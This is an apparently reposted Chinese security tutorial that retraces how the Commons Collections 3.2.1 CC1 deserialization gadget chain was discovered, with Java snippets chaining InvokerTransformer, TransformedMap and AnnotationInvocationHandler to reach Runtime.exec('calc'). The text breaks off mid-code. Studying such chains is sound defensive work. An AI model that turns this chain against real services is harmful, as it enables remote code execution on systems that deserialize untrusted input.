---
title: 学习Commons Collections 的挖掘思路
url: https://buaq.net/go-157690.html
source: unSafe.sh - 不安全
date: 2023-04-09
fetch_date: 2025-10-04T11:29:12.748136
---

# 学习Commons Collections 的挖掘思路

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/149123802b069ba8773e17791530e101.jpg)

学习Commons Collections 的挖掘思路

前言commons collections是一个对Java标准的集合框架，由Apache维护，不过3.0版本的commons collections已经不再维护了
*2023-4-8 15:43:0
Author: [xz.aliyun.com(查看原文)](/jump-157690.htm)
阅读量:40
收藏*

---

## 前言

`commons collections`是一个对Java标准的集合框架，由Apache维护，不过3.0版本的`commons collections`已经不再维护了，本次也是着重就3.0版本进行分析

本文不同于其他CC链来分析链是如何构建起来的，而是更多的去揣测或者理解链作者是如何找到该链，我们又能从中获得是什么收获，启发。

本次会就CC1，CC6和CC3进行分析，会涉及到如下知识点：

Java面向对象，Java反射，Java的JVM动态代理，和Java类加载机制等。

因为篇幅有限，在文中只能浅浅的指出，不能详细去分析各个知识点所起的重要作用，只能希望读者自行了解。

## 环境

本次使用的环境是

Java\_1.8u65

Commons-Collections 3.2.1

Java是通过[第三方网站下载](https://blog.lupf.cn/tags/JDK8 "第三方网站下载")的

OpenJdk的[源码](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 "源码")

Commons-Collections则是直接使用Maven安装即可：

```
<dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>
```

> 有意思的是当你使用IDEA安装这个CC的时候人家会告诉你这个库存在漏洞，并且给出漏洞的CVE编号。

## 思路

反序列化通常开始于`readObject()`方法，这个方法定义在`ObjectInputStream`类中，用来从一个字节流来生成一个实例对象。

readObject方法可以被重写。

当我们所要生成的类中含有一个`readObject`方法的时候，则会自动调用这个`readObject`方法从而达到代码执行的目的。

这时候就等于拥有了一个执行代码的地方了，

但是很可惜的是代码我们不可控，好的是我们可以控制对象

通过一系列**不同类但同名方法**链接，从而执行到最终可以任意代码执行的类中。

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152205-10a6c6d4-d5de-1.png)

具体思路如上图所示。

同名不同类方法一般有有很多思路，例如使用**Object类的方法**，这些可能被重写，但肯定都在；使用实现某接口的类，这些类都有接口所要求的方法；使用一些通用的方法，例如get，set等上面的三种方法我们在后面分析中都会提到。

## Transformer接口

拿到`commons collections`链，我们可以发现一个使用非常广泛的接口`Transformer`，这个`Transformer`接口就如同名字一样，是用来做转换类型，值的转换的，同时也是我们应该高度关注的，因为他会产生很多不同类同名的方法。

这个接口也很简单，只需要实现一个`transform`方法即可：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152246-28d77e6a-d5de-1.png)

这个方法接受一个Object对象，返回一个Object对象，十分宽泛。

为什么要找这个接口呢，因为当一个地方调用`transform`方法的时候，我们可以通过变换不同的实例对象从而达到执行不同的内容，并且一个使用的广泛的接口会有更多地方被使用。

看一下这个接口的实现类有哪些：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152300-316fb696-d5de-1.png)

我们将所有的实现了该接口的方法查看完后找出其中可能有用的几个方法介绍一下：

### `InvokerTransformer`类

首先要介绍的就是`InvokerTransformer`类，如同名字一样，这个类可以进行任意函数调用

看一下这个类的transform方法：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152317-3b27a054-d5de-1.png)

这个方法要做的就是调用传入类的一个方法并执行返回结果，

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152328-42052068-d5de-1.png)

通过查看构造器可以很明显的看出，需要调用的方法都是可控的，也就是说这个类可以进行任意方法的调用。

### `ChainedTransformer`类

接下来要介绍的时ChainedTransformer类，看一下这个类的transform方法：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152342-4a6049c2-d5de-1.png)

这个方法是传入一个Object对象，进行一个循环调用`iTransformers`的`transform`，将结果的Object作为下一次传入的Object。

通过查看构造器可以看出，这个`iTransformers`是可控的

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152355-52583a2c-d5de-1.png)

### `ConstantTransformer`类

这是这次介绍的最后一个类，这个类十分简单：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152409-5a72de9c-d5de-1.png)

构造器就是传入一个`iConstant`参数，`transform`调用的时候，不论传入一个什么对象，最后都返回这个这个实现设置好的`iConstant`参数。

## 思路过程

> 下面会将整个链子分成几个部分，纯属个人行为。

### 0x00第一部分

我们先写一个简单的Runtime来弹计算器，毕竟最后是要达到命令执行的

```
Runtime runtime = Runtime.getRuntime();
runtime.exec("calc");
```

下面用`InvokerTransformr`类进行执行

```
Runtime runtime = Runtime.getRuntime();
InvokerTransformer exec1 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
exec1.transform(runtime);
```

现在我们就需要找一个能够触发`transform`方法的地方，从而来进行命令执行

通过Alt+F7来寻找方法的调用：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152426-6465b58c-d5de-1.png)

看到在CC库中调用最多的是`collections`包和`map`包

这里可以分析`LazyMap`类或者`TransformedMap`类，这里我们就看`TransformedMap`类

最后我们注意到`TransformedMap`类下，一个比较好调用的方法`checkSetValue`方法

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152441-6d7e2262-d5de-1.png)

可以猜出这个方法可能和`setValue`方法有关，而`setValue`又是一个较为普遍存在的方法，所以我们先研究下这个方法。

全局追踪这个`checkSetValue`方法：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152459-784590b8-d5de-1.png)

可以发现仅有一个地方调用了`checkSetValue`，也就是我们事先猜想的`setValue`方法。

我们看一下这唯一调用 `checkSetValue`方法的`setValue`方法所在的类 `AbstractInputCheckedMapDecorator` 正是之前存在`checkSetValue`方法所在类`TransformedMap`的父类

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152511-7f63cf5e-d5de-1.png)

那就说明 `TransformedMap`继承了父类的 `checkSetvalue`方法

查看`TransformedMap`类的构造器：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152529-8a0fb6fc-d5de-1.png)

构造器被保护，但是可以看出是可以对我们需要的`valueTransformer`属性进行初始化

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152541-91283a7c-d5de-1.png)

而构造器是由一个`decorate`静态方法调用，也就是说这个类是可控的。

到此问题就发送了变化，从之前的触发`transform`方法变成了触发`setValue`方法

完成第一部分的链子

1. 新建一个`TransforedMap`类

   `TransforedMap`类需要一个Map对象，和两个实现Transformer接口的对象：

   ```
   HashMap<Object, Object> hashMap = new HashMap<>();
    hashMap.put("value","value");
    Map<Object,Object> map = TransformedMap.decorate(hashMap,null,exec1);
   ```

   这里使用了`HashMap`类创建Map对象，接着将实现transform方法的对象传入
2. 简单写一个for循环检测一下能否成功触发计算器：

   ```
   for (Map.Entry entry :map.entrySet()) {
                entry.setValue(runtime);
    }
   ```

   经过测试是完全没有问题的，到此第一步就完成了

### 0x01第二部分

我们回到之前的地方，需要我们触发`setValue`方法

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152600-9ca6ca44-d5de-1.png)

找到了一个绝杀的地方，就是在readObject中触发setValue方法，如果这个setValue方法参数可控，就意味着rce了

下面进入这个方法中进行查看：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152614-a4c720ac-d5de-1.png)

可以看出人家的写法和我们触发setValue的写法不同， **其中传入的对象不可控**，并且还有几个if判断

再看构造器

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152626-ac4c6cce-d5de-1.png)

可以看出对传入的对象是直接赋值的，不过这个类连同构造器都是默认的`default`类型，只能通过反射创建

再回到`readObject`方法中重新捋一捋思路：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152642-b55b0082-d5de-1.png)

可以看出它是将传入的注解类型进行了实例化，然后取了其中的值存到`memberTypes`中

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152658-bf18ca1e-d5de-1.png)

接着在for循环中，将默认传入的Map进行遍历，取出map中的key，然后再注解中进行查找，如果查找成功就执行第一个if，第二个是判断可不可以转换，肯定不可以，也通过。

到此我们就找到了绕过if的方法： **传入一个注解，这个注解中含有一个变量，这个变量名需要在传入Map的key中**

开始继续写链子：

首先就是这个`AnnotationInvocationHandler`类需要使用反射的方法获取

然后取出构造器才能实例化：

```
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor AIHcon = c.getDeclaredConstructor((Class<?>) Class.class, Map.class);
AIHcon.setAccessible(true);
```

现在就需要考虑传入什么参数来创建，这里我们选用`Target`元注解，因为这个注解中存在一个值value：

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408152716-ca1c983c-d5de-1.png)

我们将用来创建 `TransformedMap`的hashMap添加一个value的值：

```
HashMap<Object, Object> hashMap = new HashMap<>();
hashMap.put("value","value");
Map<Object,Object> map = TransformedMap.decorate(hashMap,null,chainedTransformer);
```

然后就可以愉快的创建 `AnnotationInvocationHandler`对象了

```
Object O = AIHcon.newInstance(Target.class,map);
```

剩下的就是反序列化这个O了，链子就算是找完了，但是到此这个链子仍然不能使用。

### 0x02第三部分

这部分就是为了修复之前链子存在的问题：

1. `Runtime`类不支持序列化操作，需要改写
2. `setValue`方法的传入参数不可控，需要绕过

我们先看第一个问题，`Runtime`类的改写，虽然`Runtime`不支持序列化，但是Class类支持呀，我们完全可以通过反射类创建一个`Runtime`类

#### Runtime改写

众所周知，Runtime是一个单例模式，所以不需要调用人家构造器，直接使用`getRuntime`类就可以了，所以我们只需要两个方法，一个是`getRuntime`方法，一个是`exec`方法就可以触发`exec`

```
Class runtimeClass = Runtime.class;
Method runtimeMethod =  runtimeClass.getMethod("getRuntime",null);
Runtime runtime = (Runtime) runtimeMethod.invoke(null,null);
Method exec1 = runtimeClass.getMethod("exec", String.class);
```

之后只需要使用

```
exec1.invoke(runtime,"calc");
```

就可以弹计算器

但是放到这个题里，我们就需要进一步进行改写，是将其中的函数调用用`InvokeTransform`实现。

对上面的反射rec进行分析，可以发现其实是一多个方法嵌套执行的结果，所需要的方法就三个：调用`getMethod`方法获取`getRuntime`；然后执行`getRuntime`得到`Runtime`类；然后对结果`Runtime`类调用`exec`方法达到任意命令执行。

将以上三个步骤的方法用`InvokeTransform`实现：

```
//getMethod
InvokerTransformer getMethod1 = new Invoker...